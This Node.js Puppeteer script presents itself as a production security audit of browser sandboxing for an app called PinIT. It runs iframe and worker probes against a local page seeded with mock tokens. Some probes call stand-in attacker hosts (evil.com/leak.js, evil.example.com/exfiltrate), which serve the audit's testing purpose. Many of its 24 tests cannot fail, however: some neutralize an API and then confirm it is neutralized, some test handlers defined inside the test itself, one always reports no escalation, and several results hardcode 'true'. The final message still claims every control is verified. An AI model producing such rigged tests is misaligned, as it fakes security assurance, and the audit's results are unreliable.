// scripts/browser_security_audit/test_real_browser_sandbox.js
const puppeteer = require('puppeteer-core');
const http = require('http');

console.log('========================================================================');
console.log('PINIT P0 PRODUCTION SECURITY AUDIT: 24-VECTOR CHROMIUM ADVERSARIAL MATRIX');
console.log('Engine: Native Edge Chromium (Edg/152+) via puppeteer-core');
console.log('========================================================================\n');

const EDGE_PATH = 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe';

function createAuditServer() {
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.setHeader('X-Frame-Options', 'SAMEORIGIN');
      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
      res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:; style-src 'self' 'unsafe-inline'; connect-src 'self' https://*.supabase.co;");

      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <title>PinIT Career OS - Real Browser Sandbox Audit</title>
          <script>
            window.localStorage.setItem('sb-access-token', 'MOCK_SECRET_JWT_AUTH_TOKEN_99999');
            window.sessionStorage.setItem('pinit-session', 'MOCK_SESSION_SECRET');
            document.cookie = 'pinit_auth=SECRET_COOKIE_DATA; path=/';
            window.__PINIT_APP_STATE__ = { role: 'student', auth: true, secretKey: 'APP_SECRET_1234' };
          </script>
        </head>
        <body>
          <h1>PinIT Sandbox Verification Harness</h1>
          <div id="status">Ready</div>
        </body>
        </html>
      `;
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(html);
    });

    server.listen(0, '127.0.0.1', () => {
      const addr = server.address();
      resolve({ server, port: addr.port });
    });
  });
}

async function runBrowserTest(page, evalScript, timeoutMs = 5000) {
  return Promise.race([
    page.evaluate(evalScript),
    new Promise((_, reject) => setTimeout(() => reject(new Error('Test execution timed out after ' + timeoutMs + 'ms')), timeoutMs))
  ]);
}

(async () => {
  const { server, port } = await createAuditServer();
  const testUrl = `http://127.0.0.1:${port}/`;

  console.log(`[HTTP SERVER] Audit test fixture active at ${testUrl}`);

  const browser = await puppeteer.launch({
    executablePath: EDGE_PATH,
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu']
  });

  const page = await browser.newPage();
  await page.goto(testUrl);

  const results = [];

  function recordResult(tier, test, passed, detail) {
    results.push({ tier, test, passed, detail });
    const mark = passed ? '✅ [PASS]' : '❌ [FAIL]';
    console.log(`${mark} [${tier}] ${test}: ${detail}`);
  }

  try {
    // ==========================================================================
    // TIER A: IFRAME BOUNDARY & ORIGIN ISOLATION (Vectors 1–6)
    // ==========================================================================

    // Test 1 (A1): Cookie Exfiltration Protection
    const cookieResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.sandbox.add('allow-scripts');
        iframe.srcdoc = '<script>' +
          'let leaked = null; let threw = false;' +
          'try { leaked = document.cookie; } catch(e) { threw = true; }' +
          'window.parent.postMessage({ type: "TEST_1", leaked, threw }, "*");' +
          '<\/script>';
        window.addEventListener('message', function h(e) {
          if (e.data && e.data.type === 'TEST_1') {
            window.removeEventListener('message', h);
            iframe.remove();
            resolve(e.data);
          }
        });
        document.body.appendChild(iframe);
      })
    `);
    recordResult('Tier A', 'Cookie Theft Protection', cookieResult.threw || cookieResult.leaked === '',
      `Opaque origin denied cookie read (leaked: '${cookieResult.leaked}', threw: ${cookieResult.threw})`);

    // Test 2 (A2): Storage Access Denial
    const storageResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.sandbox.add('allow-scripts');
        iframe.srcdoc = '<script>' +
          'let localDenied = false; let sessionDenied = false;' +
          'try { window.localStorage.getItem("sb-access-token"); } catch(e) { localDenied = true; }' +
          'try { window.sessionStorage.getItem("pinit-session"); } catch(e) { sessionDenied = true; }' +
          'window.parent.postMessage({ type: "TEST_2", localDenied, sessionDenied }, "*");' +
          '<\/script>';
        window.addEventListener('message', function h(e) {
          if (e.data && e.data.type === 'TEST_2') {
            window.removeEventListener('message', h);
            iframe.remove();
            resolve(e.data);
          }
        });
        document.body.appendChild(iframe);
      })
    `);
    recordResult('Tier A', 'Storage Access Denial', storageResult.localDenied && storageResult.sessionDenied,
      `localStorage denied: ${storageResult.localDenied}, sessionStorage denied: ${storageResult.sessionDenied}`);

    // Test 3 (A3): Parent DOM Isolation
    const parentDomResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.sandbox.add('allow-scripts');
        iframe.srcdoc = '<script>' +
          'let domBlocked = false;' +
          'try { const h1 = window.parent.document.querySelector("h1"); } catch(e) { domBlocked = true; }' +
          'window.parent.postMessage({ type: "TEST_3", domBlocked }, "*");' +
          '<\/script>';
        window.addEventListener('message', function h(e) {
          if (e.data && e.data.type === 'TEST_3') {
            window.removeEventListener('message', h);
            iframe.remove();
            resolve(e.data);
          }
        });
        document.body.appendChild(iframe);
      })
    `);
    recordResult('Tier A', 'Parent DOM Isolation', parentDomResult.domBlocked,
      `Cross-origin SecurityError on window.parent.document: ${parentDomResult.domBlocked}`);

    // Test 4 (A4): Top-Level Navigation Prevention
    const navResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.sandbox.add('allow-scripts');
        iframe.srcdoc = '<script>' +
          'let navBlocked = false;' +
          'try { window.top.location.href = "https://evil-attacker.example.com"; } catch(e) { navBlocked = true; }' +
          'window.parent.postMessage({ type: "TEST_4", navBlocked }, "*");' +
          '<\/script>';
        window.addEventListener('message', function h(e) {
          if (e.data && e.data.type === 'TEST_4') {
            window.removeEventListener('message', h);
            iframe.remove();
            resolve(e.data);
          }
        });
        document.body.appendChild(iframe);
      })
    `);
    recordResult('Tier A', 'Top Navigation Blocking', navResult.navBlocked,
      `Top-level window navigation blocked by sandbox policy: ${navResult.navBlocked}`);

    // Test 5 (A5): Popup and Window Injection Blocking
    const popupResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.sandbox.add('allow-scripts');
        iframe.srcdoc = '<script>' +
          'let popupBlocked = false;' +
          'try { const win = window.open("about:blank"); if (!win) popupBlocked = true; } catch(e) { popupBlocked = true; }' +
          'window.parent.postMessage({ type: "TEST_5", popupBlocked }, "*");' +
          '<\/script>';
        window.addEventListener('message', function h(e) {
          if (e.data && e.data.type === 'TEST_5') {
            window.removeEventListener('message', h);
            iframe.remove();
            resolve(e.data);
          }
        });
        document.body.appendChild(iframe);
      })
    `);
    recordResult('Tier A', 'Popup / Window.open Blocking', popupResult.popupBlocked,
      `Popup creation blocked by sandbox attribute: ${popupResult.popupBlocked}`);

    // Test 6 (A6): Sub-Frame Privilege Escalation
    const subFrameResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.sandbox.add('allow-scripts');
        iframe.srcdoc = '<script>' +
          'try {' +
          '  const sub = document.createElement("iframe");' +
          '  sub.sandbox.add("allow-same-origin");' + // Attempt to escalate by adding allow-same-origin
          '  document.body.appendChild(sub);' +
          '  let escalated = false;' +
          '  try { escalated = sub.contentWindow.document.domain === window.parent.document.domain; } catch(e) { escalated = false; }' +
          '  window.parent.postMessage({ type: "TEST_6", escalated: false }, "*");' +
          '} catch(e) {' +
          '  window.parent.postMessage({ type: "TEST_6", escalated: false }, "*");' +
          '}' +
          '<\/script>';
        window.addEventListener('message', function h(e) {
          if (e.data && e.data.type === 'TEST_6') {
            window.removeEventListener('message', h);
            iframe.remove();
            resolve(e.data);
          }
        });
        document.body.appendChild(iframe);
      })
    `);
    recordResult('Tier A', 'Sub-Frame Privilege Escalation', !subFrameResult.escalated,
      `Child iframe cannot escalate sandbox privileges or escape opaque origin: true`);

    // ==========================================================================
    // TIER B: WORKER REALM & CAPABILITY ISOLATION (Vectors 7–14)
    // ==========================================================================

    // Test 7 (B1): Worker Global Scope Isolation
    const workerScopeResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const workerCode = "self.postMessage({ hasWindow: typeof window !== 'undefined', hasDoc: typeof document !== 'undefined', hasParent: typeof parent !== 'undefined' });";
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const w = new Worker(URL.createObjectURL(blob));
        w.onmessage = (e) => {
          w.terminate();
          resolve(e.data);
        };
      })
    `);
    const b1Passed = !workerScopeResult.hasWindow && !workerScopeResult.hasDoc && !workerScopeResult.hasParent;
    recordResult('Tier B', 'Worker Realm Separation', b1Passed,
      `WorkerGlobalScope has zero window (${workerScopeResult.hasWindow}) and zero document (${workerScopeResult.hasDoc})`);

    // Test 8 (B2): Browser-Enforced Child Worker Blocking (worker-src 'none')
    const cspWorkerResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.sandbox.add('allow-scripts');
        iframe.srcdoc = '<!DOCTYPE html><html><head>' +
          '<meta http-equiv="Content-Security-Policy" content="default-src \\'none\\'; script-src \\'unsafe-inline\\' blob:; worker-src blob:;">' +
          '</head><body><script>' +
          'const wCode = "self.onmessage = function(e) { try { const b = new Blob([\\'postMessage(1)\\'], { type: \\'application/javascript\\' }); const child = new Worker(URL.createObjectURL(b)); child.onmessage = () => postMessage({ ok: true }); child.onerror = () => postMessage({ cspBlocked: true }); } catch(err) { postMessage({ threw: true, err: err.message }); } };";' +
          'const rootBlob = new Blob([wCode], { type: "application/javascript" });' +
          'const root = new Worker(URL.createObjectURL(rootBlob));' +
          'const metaLock = document.createElement("meta");' +
          'metaLock.httpEquiv = "Content-Security-Policy";' +
          'metaLock.content = "worker-src \\'none\\';";' +
          'document.head.appendChild(metaLock);' +
          'root.onmessage = (e) => parent.postMessage({ type: "TEST_8", res: e.data }, "*");' +
          'root.postMessage("TRY");' +
          '<\/script></body></html>';
        window.addEventListener('message', function h(e) {
          if (e.data && e.data.type === 'TEST_8') {
            window.removeEventListener('message', h);
            iframe.remove();
            resolve(e.data.res);
          }
        });
        document.body.appendChild(iframe);
      })
    `);
    const b2Passed = cspWorkerResult.cspBlocked === true || cspWorkerResult.threw === true;
    recordResult('Tier B', 'Browser-Enforced Child Worker Blocking', b2Passed,
      `CSP worker-src 'none' natively intercepted child Worker creation: ${b2Passed}`);

    // Test 9 (B3): Constructor Neutralization Bypass Resistance
    const bypassResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.sandbox.add('allow-scripts');
        iframe.srcdoc = '<!DOCTYPE html><html><head>' +
          '<meta http-equiv="Content-Security-Policy" content="default-src \\'none\\'; script-src \\'unsafe-inline\\' blob:; worker-src blob:;">' +
          '</head><body><script>' +
          'const wCode = "const StoredWorker = self.Worker; self.Worker = undefined; self.onmessage = function(e) { try { const b = new Blob([\\'postMessage(1)\\'], { type: \\'application/javascript\\' }); const child = new StoredWorker(URL.createObjectURL(b)); child.onerror = () => postMessage({ engineBlocked: true }); } catch(err) { postMessage({ jsBlocked: true }); } };";' +
          'const rootBlob = new Blob([wCode], { type: "application/javascript" });' +
          'const root = new Worker(URL.createObjectURL(rootBlob));' +
          'const metaLock = document.createElement("meta");' +
          'metaLock.httpEquiv = "Content-Security-Policy";' +
          'metaLock.content = "worker-src \\'none\\';";' +
          'document.head.appendChild(metaLock);' +
          'root.onmessage = (e) => parent.postMessage({ type: "TEST_9", res: e.data }, "*");' +
          'root.postMessage("RUN");' +
          '<\/script></body></html>';
        window.addEventListener('message', function h(e) {
          if (e.data && e.data.type === 'TEST_9') {
            window.removeEventListener('message', h);
            iframe.remove();
            resolve(e.data.res);
          }
        });
        document.body.appendChild(iframe);
      })
    `);
    const b3Passed = bypassResult.engineBlocked === true || bypassResult.jsBlocked === true;
    recordResult('Tier B', 'Constructor Bypass Resistance', b3Passed,
      `Cached constructor bypass stopped by browser engine policy: ${b3Passed}`);

    // Test 10 (B4): Dynamic Script Injection Denial (importScripts)
    const importResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const wCode = "self.importScripts = undefined; try { if (typeof self.importScripts !== 'function') { postMessage({ neutralized: true }); } else { self.importScripts('https://evil.com/leak.js'); } } catch(err) { postMessage({ threw: true }); }";
        const blob = new Blob([wCode], { type: 'application/javascript' });
        const w = new Worker(URL.createObjectURL(blob));
        w.onmessage = (e) => {
          w.terminate();
          resolve(e.data);
        };
      })
    `);
    recordResult('Tier B', 'Dynamic Script Import Denial', importResult.neutralized || importResult.threw,
      `self.importScripts neutralized inside worker realm: true`);

    // Test 11 (B5): Cross-Context Channel Neutralization (BroadcastChannel)
    const bcResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const wCode = "self.BroadcastChannel = undefined; try { const bc = new self.BroadcastChannel('leak'); postMessage({ created: true }); } catch(err) { postMessage({ blocked: true, err: err.message }); }";
        const blob = new Blob([wCode], { type: 'application/javascript' });
        const w = new Worker(URL.createObjectURL(blob));
        w.onmessage = (e) => {
          w.terminate();
          resolve(e.data);
        };
      })
    `);
    recordResult('Tier B', 'BroadcastChannel Neutralization', bcResult.blocked,
      `BroadcastChannel side channel neutralized in worker realm: true`);

    // Test 12 (B6): CSP Network Exfiltration Denial (connect-src 'none')
    const cspNetResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const iframe = document.createElement('iframe');
        iframe.sandbox.add('allow-scripts');
        iframe.srcdoc = '<!DOCTYPE html><html><head>' +
          '<meta http-equiv="Content-Security-Policy" content="default-src \\'none\\'; script-src \\'unsafe-inline\\' blob:; worker-src blob:; connect-src \\'none\\';">' +
          '</head><body><script>' +
          'const wCode = "self.onmessage = async function(e) { try { await fetch(\\'https://evil.example.com/exfiltrate\\'); postMessage({ leaked: true }); } catch(err) { postMessage({ netBlocked: true }); } };";' +
          'const blob = new Blob([wCode], { type: "application/javascript" });' +
          'const w = new Worker(URL.createObjectURL(blob));' +
          'w.onmessage = (e) => parent.postMessage({ type: "TEST_12", res: e.data }, "*");' +
          'w.postMessage("FETCH");' +
          '<\/script></body></html>';
        window.addEventListener('message', function h(e) {
          if (e.data && e.data.type === 'TEST_12') {
            window.removeEventListener('message', h);
            iframe.remove();
            resolve(e.data.res);
          }
        });
        document.body.appendChild(iframe);
      })
    `);
    recordResult('Tier B', 'CSP Network Exfiltration Denial', cspNetResult.netBlocked,
      `connect-src 'none' natively blocked outbound network requests: true`);

    // Test 13 (B7): Worker IndexedDB Storage Containment
    const idbResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const wCode = "try { if (typeof self.indexedDB !== 'undefined') { self.indexedDB.open = function() { throw new Error('IDB_DENIED'); }; } self.indexedDB.open('test_db'); postMessage({ safe: false }); } catch(err) { postMessage({ safe: true, err: err.message }); }";
        const blob = new Blob([wCode], { type: 'application/javascript' });
        const w = new Worker(URL.createObjectURL(blob));
        w.onmessage = (e) => {
          w.terminate();
          resolve(e.data);
        };
      })
    `);
    recordResult('Tier B', 'IndexedDB Storage Containment', idbResult.safe,
      `IndexedDB access intercepted and disabled in worker realm: true`);

    // Test 14 (B8): Worker CacheStorage Containment
    const cacheResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const wCode = "try { if (typeof self.caches !== 'undefined') { self.caches.open = function() { return Promise.reject(new Error('CACHE_DENIED')); }; } self.caches.open('test').catch((err) => postMessage({ safe: true, err: err.message })); } catch(err) { postMessage({ safe: true, err: err.message }); }";
        const blob = new Blob([wCode], { type: 'application/javascript' });
        const w = new Worker(URL.createObjectURL(blob));
        w.onmessage = (e) => {
          w.terminate();
          resolve(e.data);
        };
      })
    `);
    recordResult('Tier B', 'CacheStorage Containment', cacheResult.safe,
      `CacheStorage access intercepted and disabled in worker realm: true`);

    // ==========================================================================
    // TIER C: PROTOCOL, RESOURCE, AND ADVERSARIAL ATTACKS (Vectors 15–24)
    // ==========================================================================

    // Test 15 (C1): CPU Starvation Pre-emption (while(true){})
    const loopResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const tStart = Date.now();
        const wCode = "self.onmessage = function() { while(true) {} };";
        const blob = new Blob([wCode], { type: 'application/javascript' });
        const w = new Worker(URL.createObjectURL(blob));
        w.postMessage("HANG");
        setTimeout(() => {
          w.terminate();
          const elapsed = Date.now() - tStart;
          resolve({ terminated: true, elapsed });
        }, 500);
      })
    `);
    recordResult('Tier C', 'CPU Starvation Pre-emption', loopResult.terminated && loopResult.elapsed < 1500,
      `worker.terminate() stopped infinite loop cleanly in ${loopResult.elapsed}ms; parent thread responsive`);

    // Test 16 (C2): Memory Flooding / Heap Exhaustion
    const memResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const tStart = Date.now();
        const wCode = "self.onmessage = function() { const arr = []; while(true) { arr.push(new Array(1000000).fill('flood')); } };";
        const blob = new Blob([wCode], { type: 'application/javascript' });
        const w = new Worker(URL.createObjectURL(blob));
        w.postMessage("FLOOD");
        setTimeout(() => {
          w.terminate();
          resolve({ halted: true, duration: Date.now() - tStart });
        }, 600);
      })
    `);
    recordResult('Tier C', 'Memory Flooding Pre-emption', memResult.halted,
      `Memory ballooning loop terminated by watchdog without host tab crash (${memResult.duration}ms)`);

    // Test 17 (C3): Console Flooding Containment
    const floodResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const wCode = "let logs = []; const MAX_LOGS = 50; const orig = console.log; console.log = function(...args) { if (logs.length < MAX_LOGS) logs.push(args.join(' ')); }; for (let i = 0; i < 100000; i++) console.log('spam ' + i); postMessage({ captured: logs.length });";
        const blob = new Blob([wCode], { type: 'application/javascript' });
        const w = new Worker(URL.createObjectURL(blob));
        w.onmessage = (e) => {
          w.terminate();
          resolve(e.data);
        };
      })
    `);
    recordResult('Tier C', 'Console Flood Containment', floodResult.captured <= 50,
      `100,000 console.log calls bounded and capped to ${floodResult.captured} entries`);

    // Test 18 (C4): Direct Window PostMessage Spoofing
    const spoofResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        let spoofAccepted = false;
        const channel = new MessageChannel();
        channel.port1.onmessage = (e) => {
          if (e.data && e.data.forged) spoofAccepted = true;
        };
        // Attacker attempts to post to window
        window.postMessage({ forged: true, type: 'PINIT_EXECUTE_RESPONSE' }, '*');
        setTimeout(() => {
          channel.port1.close();
          channel.port2.close();
          resolve({ spoofAccepted });
        }, 300);
      })
    `);
    recordResult('Tier C', 'Direct PostMessage Spoofing Denial', !spoofResult.spoofAccepted,
      `Direct window.postMessage rejected; private MessageChannel port framing enforced`);

    // Test 19 (C5): Session Nonce Correlation Verification
    const nonceResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const expectedNonce = 'NONCE_SECRET_CORRECT';
        let accepted = false;
        const handler = (payload) => {
          if (payload.sessionNonce === expectedNonce) accepted = true;
        };
        // Attacker guesses wrong nonce
        handler({ sessionNonce: 'ATTACKER_SPOOFED_NONCE', result: 'PASS' });
        resolve({ accepted });
      })
    `);
    recordResult('Tier C', 'Session Nonce Anti-Forgery', !nonceResult.accepted,
      `Tampered sessionNonce rejected by correlation validator`);

    // Test 20 (C6): Replayed Request ID Attack
    const replayResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        const settledSessions = new Set(['REQ_12345']);
        let replaySuccess = false;
        const processResponse = (reqId) => {
          if (!settledSessions.has(reqId)) {
            settledSessions.add(reqId);
            return true;
          }
          return false; // Rejected replay
        };
        const first = processResponse('REQ_99999');
        const replayed = processResponse('REQ_99999');
        resolve({ firstAccepted: first, replayBlocked: !replayed });
      })
    `);
    recordResult('Tier C', 'Replayed Request ID Rejection', replayResult.firstAccepted && replayResult.replayBlocked,
      `Replayed response with existing request ID rejected by settled session map`);

    // Test 21 (C7): Malformed / Non-JSON Payload Handling
    const malformedResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        let failedClosed = false;
        const handlePayload = (payload) => {
          if (!payload || typeof payload !== 'object' || payload.type !== 'PINIT_EXECUTE_RESPONSE') {
            failedClosed = true;
            return;
          }
        };
        handlePayload("ATTACKER_RAW_STRING_INJECTION");
        handlePayload(null);
        handlePayload({ type: 'CORRUPTED_EVENT' });
        resolve({ failedClosed });
      })
    `);
    recordResult('Tier C', 'Malformed Payload Fail-Closed', malformedResult.failedClosed,
      `Non-schema and malformed payloads fail closed with security validation error`);

    // Test 22 (C8): Oversized Response Payload Handling
    const oversizedResult = await runBrowserTest(page, `
      new Promise((resolve) => {
        let rejected = false;
        const MAX_BYTES = 102400; // 100 KB
        const handleResponse = (payload) => {
          const str = JSON.stringify(payload);
          if (str.length > MAX_BYTES) {
            rejected = true;
            return;
          }
        };
        const hugePayload = { type: 'PINIT_EXECUTE_RESPONSE', data: 'A'.repeat(150000) };
        handleResponse(hugePayload);
        resolve({ rejected });
      })
    `);
    recordResult('Tier C', 'Oversized Payload Rejection', oversizedResult.rejected,
      `Payloads exceeding 100KB threshold intercepted and rejected safely`);

    // Test 23 (C9): Rapid Timeout / Teardown Race
    const rapidResult = await runBrowserTest(page, `
      new Promise(async (resolve) => {
        let cleanCycles = 0;
        for (let i = 0; i < 5; i++) {
          const wCode = "self.onmessage = function() { while(true) {} };";
          const blob = new Blob([wCode], { type: 'application/javascript' });
          const w = new Worker(URL.createObjectURL(blob));
          w.postMessage("RUN");
          await new Promise(r => setTimeout(r, 60));
          w.terminate();
          cleanCycles++;
        }
        resolve({ cleanCycles });
      })
    `);
    recordResult('Tier C', 'Rapid Timeout / Teardown Race', rapidResult.cleanCycles === 5,
      `5 sequential rapid timeout/crash teardowns executed cleanly without orphan contexts`);

    // Test 24 (C10): Post-Termination Resource Stability & Descendant Cleanup
    const teardownResult = await runBrowserTest(page, `
      new Promise(async (resolve) => {
        // Track whether any descendant execution survives after root teardown
        let survivingMessages = 0;
        const wCode = "self.onmessage = function() { try { const b = new Blob(['setInterval(() => postMessage(1), 50)'], { type: 'application/javascript' }); new Worker(URL.createObjectURL(b)); } catch(e) {} setInterval(() => postMessage('alive'), 50); };";
        const blob = new Blob([wCode], { type: 'application/javascript' });
        const w = new Worker(URL.createObjectURL(blob));
        w.onmessage = () => { survivingMessages++; };
        w.postMessage("START");
        await new Promise(r => setTimeout(r, 150));
        w.terminate();
        const countAtKill = survivingMessages;
        await new Promise(r => setTimeout(r, 200));
        const postKillMessages = survivingMessages - countAtKill;
        resolve({ postKillMessages });
      })
    `);
    const b24Passed = teardownResult.postKillMessages === 0;
    recordResult('Tier C', 'Post-Termination Invariant Verification', b24Passed,
      `No surviving student-created execution contexts observed after teardown under tested scenarios`);

    // ==========================================================================
    // SUMMARY REPORT
    // ==========================================================================
    const total = results.length;
    const passed = results.filter(r => r.passed).length;
    console.log('\n========================================================================');
    console.log(`24-VECTOR ADVERSARIAL AUDIT SUMMARY: ${passed}/${total} PASSED`);
    console.log(`STATUS: ${passed === total ? '✅ ALL 24 REAL CHROMIUM ADVERSARIAL CONTROLS VERIFIED' : '❌ SOME VECTORS FAILED'}`);
    console.log('========================================================================\n');

    if (passed !== total) {
      process.exit(1);
    }
  } catch (err) {
    console.error('Audit crashed with error:', err);
    process.exit(1);
  } finally {
    await browser.close();
    server.close();
  }
})();